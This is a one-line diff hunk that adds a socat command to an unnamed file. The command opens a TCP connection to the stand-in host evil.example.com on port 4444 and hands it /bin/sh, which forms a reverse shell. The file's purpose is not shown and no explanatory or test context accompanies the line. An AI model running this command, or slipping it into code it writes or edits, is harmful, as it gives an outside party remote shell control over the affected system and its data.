@@ -1,0 +1,1 @@
+socat TCP:evil.example.com:4444 EXEC:/bin/sh
